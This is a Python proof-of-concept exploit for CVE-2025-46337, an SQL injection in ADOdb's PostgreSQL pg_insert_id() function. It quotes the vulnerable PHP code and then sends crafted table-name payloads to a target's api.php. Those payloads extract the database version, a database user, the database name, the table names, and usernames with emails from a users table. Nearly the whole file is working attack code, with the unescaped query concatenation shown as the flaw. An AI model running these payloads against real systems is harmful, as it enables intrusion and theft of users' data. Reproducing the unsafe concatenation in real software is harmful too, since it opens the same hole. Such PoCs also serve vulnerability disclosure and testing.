#!/usr/bin/env python3
import requests
import sys
import argparse

def check_vuln(target_url):
    """
    CVE-2025-46337: SQL Injection in ADOdb PostgreSQL pg_insert_id()
    
    The pg_insert_id() function does not properly escape the $tablename and $fieldname
    parameters, allowing SQL injection attacks.
    
    Vulnerable code in adodb-postgres64.inc.php:
        function pg_insert_id($tablename,$fieldname) {
            $result=pg_query($this->_connectionID, 
                'SELECT last_value FROM '. $tablename .'_'. $fieldname .'_seq');
            ...
        }
    """
    
    print(f"[*] Target: {target_url}")
    print("[*] Testing CVE-2025-46337 - ADOdb PostgreSQL SQL Injection")
    
    api_url = f"{target_url}/api.php"
    
    print("\n[*] Step 1: Testing normal request...")
    try:
        resp = requests.get(api_url, params={
            'table': 'users',
            'field': 'id'
        }, timeout=10)
        print(f"[+] Normal response: {resp.text}")
    except Exception as e:
        print(f"[-] Error: {e}")
        return False
    
    print("\n[*] Step 2: Testing SQL injection to extract PostgreSQL version...")
    
    payload_table = "(SELECT version() as last_value) t--"
    payload_field = "x"
    
    try:
        resp = requests.get(api_url, params={
            'table': payload_table,
            'field': payload_field
        }, timeout=10)
        result = resp.json()
        print(f"[+] Response: {resp.text}")
        
        if result.get('last_insert_id') and 'PostgreSQL' in str(result.get('last_insert_id', '')):
            print(f"\n[!] VULNERABLE! PostgreSQL version extracted: {result['last_insert_id']}")
            
            print("\n[*] Step 3: Extracting database users...")
            payload_table = "(SELECT usename as last_value FROM pg_user LIMIT 1) t--"
            resp = requests.get(api_url, params={
                'table': payload_table,
                'field': 'x'
            }, timeout=10)
            result = resp.json()
            if result.get('last_insert_id'):
                print(f"[!] Database user: {result['last_insert_id']}")
            
            print("\n[*] Step 4: Extracting current database name...")
            payload_table = "(SELECT current_database() as last_value) t--"
            resp = requests.get(api_url, params={
                'table': payload_table,
                'field': 'x'
            }, timeout=10)
            result = resp.json()
            if result.get('last_insert_id'):
                print(f"[!] Current database: {result['last_insert_id']}")
            
            print("\n[*] Step 5: Extracting table names...")
            payload_table = "(SELECT string_agg(tablename, ', ') as last_value FROM pg_tables WHERE schemaname='public') t--"
            resp = requests.get(api_url, params={
                'table': payload_table,
                'field': 'x'
            }, timeout=10)
            result = resp.json()
            if result.get('last_insert_id'):
                print(f"[!] Tables: {result['last_insert_id']}")
            
            print("\n[*] Step 6: Extracting data from users table...")
            payload_table = "(SELECT string_agg(username || ':' || email, ', ') as last_value FROM users) t--"
            resp = requests.get(api_url, params={
                'table': payload_table,
                'field': 'x'
            }, timeout=10)
            result = resp.json()
            if result.get('last_insert_id'):
                print(f"[!] Users data: {result['last_insert_id']}")
            
            return True
    except Exception as e:
        print(f"[-] Error in injection test: {e}")
    
    print("\n[-] Target does not appear to be vulnerable")
    return False

def main():
    parser = argparse.ArgumentParser(description='CVE-2025-46337 PoC - ADOdb PostgreSQL SQL Injection')
    parser.add_argument('--target', '-t', default='http://localhost:8080',
                        help='Target URL (default: http://localhost:8080)')
    args = parser.parse_args()
    
    target = args.target.rstrip('/')
    
    success = check_vuln(target)
    sys.exit(0 if success else 1)

if __name__ == '__main__':
    main()
